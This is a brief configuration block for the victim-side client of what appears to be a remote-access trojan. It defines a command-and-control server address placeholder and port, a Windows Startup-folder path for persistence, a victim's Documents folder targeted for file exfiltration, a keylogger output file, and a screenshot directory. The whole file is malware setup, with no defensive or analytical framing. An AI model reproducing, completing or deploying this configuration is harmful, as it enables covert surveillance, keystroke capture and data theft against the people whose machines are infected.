# Client Configuration (Victim Side)
SERVER_IP = "attacker_ip"  # Replace with the C2 server's IP address (the attacker's machine)
SERVER_PORT = 9999        # Port to connect to on the C2 server (should match the server's port)

# Persistence Configuration
PERSISTENCE_PATH = "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"  # Path to startup folder (for Windows)

# File Exfiltration Configuration
EXFILTRATION_DIR = "C:\\Users\\Victim\\Documents"  # Folder to scan for files to exfiltrate

# Keylogger Configuration
KEYLOG_FILE = "keylog.txt"  # File where captured keystrokes will be stored

# Screenshot Configuration
SCREENSHOT_DIR = "C:\\Users\\Victim\\Pictures"  # Directory to save screenshots
